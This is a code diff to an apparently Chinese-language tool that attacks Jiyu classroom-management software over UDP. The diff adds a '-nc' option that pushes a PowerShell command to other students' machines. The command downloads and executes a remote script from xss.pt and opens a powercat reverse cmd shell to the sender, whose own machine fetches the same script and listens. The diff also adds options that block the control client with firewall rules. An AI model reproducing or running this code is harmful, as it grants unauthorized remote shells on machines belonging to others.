@@ -1,6 +1,6 @@
 import sys
 import socket
-from os import popen
+from os import popen, system
 from re import compile
 from time import sleep
 from struct import pack
@@ -39,12 +39,24 @@ error_msg = """
         -l    loop * times, default = 1 循环次数，默认为1
 
         -t    loop interval, default = 22 s 循环时间间隔，默认是22秒
+
+
+        -------------------- Extra Options --------------------
+        
+        -nc   反弹shell的机器需出网，退出可使用命令exit
         
         -g    single options, Gets the current Intranet IP and student 
               client possible ports. 
               独立选项，获取当前的ip地址以及学生端监听的端口。
               If choose this options, other are become invalid. 
               如果选择了这个选项，其他选项将会失效。
+         
+        -break     独立选项，脱离屏幕控制，需要管理员权限
+
+        -continue  独立选项，恢复屏幕控制
+
+        ------------------- Github Repositories -------------------
+               https://github.com/ht0Ruial/Jiyu_udp_attack
 
         """ % sys.argv[0]
 aasr = """
@@ -157,22 +169,6 @@ def creat_send_object(command):
         'l' : 1,
     }
     send_list = []
-    if '-g' in command:
-        hostname = socket.gethostname()
-        ip = socket.gethostbyname(hostname)
-        print("\nYour ip addres is:" + ip)
-
-        tasklist = popen("tasklist|find \"Student\"").read()
-        pattern = compile(r'[e]\s*\d{1,5}\s*[C]')
-        pid = (pattern.search(tasklist).group()[1:-1]).strip()
-
-        netstat = popen("netstat -ano |find \"{}\"".format(pid)).read()
-        pattern = compile(r"%s:\d{1,5}\s*[*]{1}" % ip)
-        netstat_pat =pattern.findall(netstat)
-
-        ports= [((i.strip(ip)[1:-1]).rstrip()) for i in netstat_pat]
-        print("\nYour student client possible ports are:" + ','.join(ports))
-        sys.exit(0)
 
     # 获取ip
     if '-ip' in command:
@@ -186,25 +182,74 @@ def creat_send_object(command):
     # 获取命令内容
     if '-msg' in command:
         send_list.append(pkg_sendlist('-msg', command[command.index('-msg') + 1]))
+
     if '-c' in command:
         send_list.append(pkg_sendlist('-c', command[command.index('-c') + 1]))
+
     if '-r' in command:
         send_list.append(basicCMD['-r'])
+
     if '-s' in command:
         send_list.append(basicCMD['-s'])
+
     if '-t' in command:
         if judge_is_num(command[command.index('-t') + 1]):
             config['t'] = int(command[command.index('-t') + 1])
+
     if '-l' in command:
         if judge_is_num(command[command.index('-l') + 1]):
             config['l'] = int(command[command.index('-l') + 1])
+
+    if '-nc' in command:
+        hostname = socket.gethostname()
+        ip = socket.gethostbyname(hostname)
+        cmd = "powershell IEX (New-Object System.Net.Webclient).DownloadString('https://xss.pt/hYvg');powercat -c {} -p 39077 -e cmd".format(ip)
+        send_list.append(pkg_sendlist('-c', cmd))
+
     return config, send_list
+
+
+def single_command(command):
+    if '-g' in command:
+        try :
+            hostname = socket.gethostname()
+            ip = socket.gethostbyname(hostname)
+            print("\nYour ip addres is:" + ip)
+
+            tasklist = popen("tasklist|find \"Student\"").read()
+            pattern = compile(r'[e]\s*\d{1,5}\s*[C]')
+            pid = (pattern.search(tasklist).group()[1:-1]).strip()
+
+            netstat = popen("netstat -ano |find \"{}\"".format(pid)).read()
+            pattern = compile(r"%s:\d{1,5}\s*[*]{1}" % ip)
+            netstat_pat =pattern.findall(netstat)
+
+            ports= [((i.strip(ip)[1:-1]).rstrip()) for i in netstat_pat]
+            print("\nYour student client possible ports are:" + ','.join(ports))
+        except:
+            pass
+        sys.exit(0)
+
+
+    elif '-break' in command:
+        popen('sc config MpsSvc start= auto')
+        popen('net start MpsSvc')
+        popen('netsh advfirewall set allprofiles state on')
+        popen('netsh advfirewall firewall set rule name="StudentMain.exe" new action=block')
+        sys.exit(0)
+
+    elif '-continue' in command:
+        popen('netsh advfirewall firewall set rule name="StudentMain.exe" new action=allow')
+        sys.exit(0)
 
 
 def run_from_cmd(command):
     try:
+        single_command(command)
         config, send_list = creat_send_object(sys.argv)
         send(config, send_list)
+        if '-nc' in command:
+            system("powershell.exe IEX (New-Object System.Net.Webclient).DownloadString('https://xss.pt/hYvg');powercat -l -p 39077")
     except Exception as e:
         print(error_msg, aasr)
         print("[-] %s" % e)
